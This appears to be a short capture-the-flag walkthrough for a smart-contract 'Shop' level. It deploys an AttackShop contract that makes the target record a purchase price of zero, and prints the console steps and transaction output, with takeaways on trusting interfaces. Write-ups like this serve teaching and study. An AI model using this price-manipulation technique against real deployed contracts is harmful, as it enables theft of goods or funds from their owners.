*Key Security Takeaways

Don’t let interface function unimplemented. 

Interfaces do not guarantee contract security. 

Remember that just because another contract uses the same interface, doesn’t mean it will behave as intended! 
```
>contract.address
'0xb8EE4846EA4E67ad149aaf1a3AdbA34E65D669d4'
```

//select contract of AttackShop.sol, then Deploy shop of contract address 
```
'0xb8EE4846EA4E67ad149aaf1a3AdbA34E65D669d4'
```

//check the "price"  
```
0: uint256: 100 
```

//check the "shop" 0:
```
address: 0xb8EE4846EA4E67ad149aaf1a3AdbA34E65D669d4
```

//call buy send to zero, it's gonna be true when it call twice 
```
[block:10964719 txIndex:4]from: 0xF6e...f30F5to: AttackShop.buy() 0x360...36Da3value: 0 weidata: 0xa6f...2ae3alogs: 0hash: 0x9d4...c5039
```

//check the "price" again -> zero. succesed override price "zero"
```
0:uint256: 0
[call]from: 0xF6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5to: AttackShop.price()data: 0xa03...5b1fe
```